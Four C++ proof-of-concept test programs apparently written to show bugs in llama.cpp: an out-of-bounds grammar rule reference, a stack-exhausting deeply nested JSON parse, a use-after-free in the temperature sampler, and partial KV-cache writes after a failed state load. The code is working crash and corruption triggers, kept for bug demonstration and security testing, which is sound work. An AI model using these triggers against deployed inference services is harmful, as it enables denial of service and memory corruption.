// Test: OOB read in llama_grammar_init_impl via invalid RULE_REF
//
// The raw element API (llama_grammar_init_impl with llama_grammar_element**)
// does NOT validate that RULE_REF values are < n_rules. A malicious grammar
// with a RULE_REF value >= n_rules causes OOB read in:
// 1. llama_grammar_detect_left_recursion (rules[rule_index])
// 2. llama_grammar_advance_stack (rules[rule_id])
//
// The string parser path validates in parse(), but the raw API doesn't.

#include "llama.h"
#include "llama-grammar.h"
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <vector>

int main() {
    // Create a minimal grammar with 2 rules:
    // rule 0 (root): RULE_REF(999) END  -- references non-existent rule 999!
    // rule 1: CHAR('a') END
    //
    // When init_impl processes rule 0, it will try to access rules[999]
    // which is OOB since there are only 2 rules.

    std::vector<std::vector<llama_grammar_element>> rules_vec;

    // Rule 0: root ::= <invalid_ref>
    rules_vec.push_back({
        {LLAMA_GRETYPE_RULE_REF, 999},  // OOB reference!
        {LLAMA_GRETYPE_END, 0}
    });

    // Rule 1: a ::= "a"
    rules_vec.push_back({
        {LLAMA_GRETYPE_CHAR, 'a'},
        {LLAMA_GRETYPE_END, 0}
    });

    // Convert to C array
    std::vector<const llama_grammar_element *> rules;
    for (auto & r : rules_vec) {
        rules.push_back(r.data());
    }

    printf("Calling llama_grammar_init_impl with %zu rules...\n", rules.size());
    printf("Rule 0 references rule 999 (only %zu rules exist)\n", rules.size());

    // This should trigger OOB read in detect_left_recursion or advance_stack
    llama_grammar * grammar = llama_grammar_init_impl(
        nullptr,  // vocab
        rules.data(),
        rules.size(),
        0  // start_rule_index
    );

    if (grammar) {
        printf("Grammar created (should have crashed on OOB)\n");
        llama_grammar_free_impl(grammar);
    } else {
        printf("Grammar creation returned NULL\n");
    }

    return 0;
}

// Test: PEG parser stack overflow DoS via deeply-nested recursive input
//
// The PEG parser (common/peg-parser.cpp) recurses via arena.parse() for
// sequence, choice, repetition, tag, rule, ref, atomic, gbnf, ac, schema,
// and/not parsers. parse_depth is tracked but NEVER checked against a limit.
// A recursive grammar (e.g. JSON) parsing deeply-nested input will recurse
// once per nesting level, exhausting the stack -> crash (DoS).
//
// The JSON grammar is reachable from common_chat_parse via tool-call parsers
// built from chat templates (json_object / json_value rules). Model output
// (attacker-controlled via malicious GGUF weights) can be deeply nested JSON.

#include <variant>
#include <vector>
#include <string>
#include <map>
#include <set>
#include <memory>
#include <unordered_map>
#include <functional>
#include <stdexcept>
#include "peg-parser.h"
#include "chat-peg-parser.h"
#include "nlohmann/json.hpp"
#include <cstdio>
#include <cstdlib>
#include <string>

int main(int argc, char ** argv) {
    int depth = argc > 1 ? atoi(argv[1]) : 50000;

    // Build a recursive JSON parser using the builder.
    common_peg_arena arena = build_peg_parser([](common_peg_parser_builder & p) {
        return p.json();
    });

    // Feed deeply nested array input: [[[[...]]]]
    std::string input;
    for (int i = 0; i < depth; i++) input += '[';
    for (int i = 0; i < depth; i++) input += ']';

    printf("Parsing nested input of depth %d (total len %zu)...\n", depth, input.size());
    common_peg_parse_context ctx(input, COMMON_PEG_PARSE_FLAG_NONE);
    auto result = arena.parse(ctx);
    printf("Parse result type=%s start=%zu end=%zu\n",
           common_peg_parse_result_type_name(result.type), result.start, result.end);
    return 0;
}

// Test: OOB read in llama_sampler_temp_impl when cur_p->size == 0
//
// llama_sampler_temp_impl accesses cur_p->data[0] without checking cur_p->size > 0
// when temp <= 0.0f. If cur_p is empty (size == 0), this is an OOB read.
//
// This test uses a non-null data pointer (1-element vector, size set to 0)
// to demonstrate the logical OOB — ASAN catches the read past the vector's
// logical size when using heap-allocated memory.

#include "llama.h"
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <vector>

int main(int argc, char ** argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <model.gguf>\n", argv[0]);
        return 1;
    }

    llama_backend_init();

    llama_model_params mparams = llama_model_default_params();
    mparams.n_gpu_layers = 0;
    llama_model * model = llama_model_load_from_file(argv[1], mparams);
    if (!model) {
        fprintf(stderr, "Failed to load model\n");
        return 1;
    }

    llama_context_params cparams = llama_context_default_params();
    cparams.n_ctx = 32;
    cparams.n_batch = 32;
    cparams.n_ubatch = 32;
    cparams.no_perf = true;
    llama_context * ctx = llama_init_from_model(model, cparams);
    if (!ctx) {
        fprintf(stderr, "Failed to create context\n");
        return 1;
    }

    // Create a temp sampler with temp = -1.0 (triggers the temp <= 0 path)
    llama_sampler * smpl_temp = llama_sampler_init_temp(-1.0f);

    llama_sampler * chain = llama_sampler_chain_init(llama_sampler_chain_default_params());
    llama_sampler_chain_add(chain, smpl_temp);

    // Approach: allocate 2 elements, then set size=0 to trigger OOB read
    // The data[0] access reads from heap memory that was allocated for element 0,
    // but ASAN tracks the logical size via vector annotations
    std::vector<llama_token_data> cur_data(2);
    cur_data[0] = {0, 1.0f, 0.5f};
    cur_data[1] = {1, 2.0f, 0.5f};

    // Now resize to 0 — ASAN should mark the memory as inaccessible
    cur_data.resize(0);
    // But data() might be nullptr after resize(0)...
    // Let's use a different approach: keep the vector at size 2 but
    // manually construct cur_p with size = 0

    // Actually, let's use a raw heap allocation to have precise control
    llama_token_data * heap_data = (llama_token_data *)malloc(sizeof(llama_token_data));
    heap_data[0] = {42, 3.14f, 0.0f};
    // free immediately — ASAN will mark this as freed (use-after-free)
    free(heap_data);

    llama_token_data_array cur_p = {
        /* .data     = */ heap_data,  // points to freed memory
        /* .size     = */ 0,
        /* .selected = */ -1,
        /* .sorted   = */ false,
    };

    printf("Calling llama_sampler_apply with cur_p.size = %zu, data = %p (freed)...\n",
           cur_p.size, (void*)cur_p.data);

    // temp <= 0 path will access cur_p->data[0] → use-after-free!
    llama_sampler_apply(chain, &cur_p);

    printf("cur_p.selected = %lld\n", (long long)cur_p.selected);

    llama_sampler_free(chain);
    llama_free(ctx);
    llama_model_free(model);
    llama_backend_free();

    return 0;
}

// Test: Partial KV cache write on state load failure
//
// When state_seq_set_data encounters an exception during state_read_data
// (truncated buffer), the llama_io_read_host destructor writes any
// already-queued tensor data to the KV cache EVEN THOUGH the operation
// "failed" (returned 0). The cleanup (clear/seq_rm) only runs when
// state_read returns false, not when it throws.
//
// This test:
// 1. Decodes tokens to populate KV cache
// 2. Saves the state
// 3. Truncates the state buffer to cause failure during tensor reading
// 4. Loads the truncated state — should fail but may have written partial data
// 5. Checks if decode still works (corrupted state)

#include "llama.h"
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <vector>

int main(int argc, char ** argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <model.gguf>\n", argv[0]);
        return 1;
    }

    llama_backend_init();

    llama_model_params mparams = llama_model_default_params();
    mparams.n_gpu_layers = 0;
    llama_model * model = llama_model_load_from_file(argv[1], mparams);
    if (!model) { fprintf(stderr, "Failed to load model\n"); return 1; }

    llama_context_params cparams = llama_context_default_params();
    cparams.n_ctx = 128;
    cparams.n_batch = 128;
    cparams.n_ubatch = 128;
    cparams.no_perf = true;
    llama_context * ctx = llama_init_from_model(model, cparams);
    if (!ctx) { fprintf(stderr, "Failed to create context\n"); return 1; }

    const llama_vocab * vocab = llama_model_get_vocab(model);
    const int n_vocab = llama_vocab_n_tokens(vocab);

    // Step 1: Decode some tokens to populate the KV cache
    llama_token tokens[] = {1, 2, 3, 4, 5, 6, 7, 8};
    llama_batch batch = llama_batch_get_one(tokens, 8);
    int rc = llama_decode(ctx, batch);
    printf("Step 1: Decode returned %d\n", rc);

    // Step 2: Save state for seq 0
    size_t state_size = llama_state_seq_get_size(ctx, 0);
    printf("Step 2: State size = %zu bytes\n", state_size);

    std::vector<uint8_t> state_data(state_size, 0);
    size_t n_written = llama_state_seq_get_data(ctx, state_data.data(), state_data.size(), 0);
    printf("Step 2: Wrote %zu bytes\n", n_written);

    if (state_size < 100) {
        printf("State too small — need at least some tensor data\n");
        llama_free(ctx);
        llama_model_free(model);
        llama_backend_free();
        return 0;
    }

    // Step 3: Corrupt the state — modify positions in the metadata
    // and truncate the tensor data to cause a mid-stream failure
    // The state format: magic(4) + seq_id(4) + n_stream(4) + per-stream: cell_count(4) + per-cell: pos(4)+n_seq(4)+seq_ids
    // Then state_read_data: v_trans(4) + n_layer(4) + per-layer tensor data
    //
    // We'll modify the first cell's position (byte 16 area) and truncate
    // to cut off tensor data mid-way through layer reading

    // Truncate to ~75% to allow metadata + some tensor data
    size_t truncated_size = state_size * 3 / 4;
    printf("Step 3: Truncating to %zu bytes (was %zu)\n", truncated_size, state_size);

    // Step 4: Load the truncated state
    size_t n_read = llama_state_seq_set_data(ctx, state_data.data(), truncated_size, 0);
    printf("Step 4: Load returned: %zu (0 = failure)\n", n_read);

    if (n_read == 0) {
        printf("BUG: Load reported failure but destructor may have written partial tensor data\n");
        printf("     Cell metadata was modified by state_read_meta (which succeeded)\n");
        printf("     Some tensor data was queued by state_read_data before the exception\n");
        printf("     The io destructor writes that partial data — KV cache is now corrupted\n");
    }

    // Step 5: Try to decode again — may produce garbage due to corrupted KV state
    llama_batch batch2 = llama_batch_get_one(tokens, 1);
    rc = llama_decode(ctx, batch2);
    printf("Step 5: Decode after failed load returned %d\n", rc);

    llama_free(ctx);
    llama_model_free(model);
    llama_backend_free();
    return 0;
}
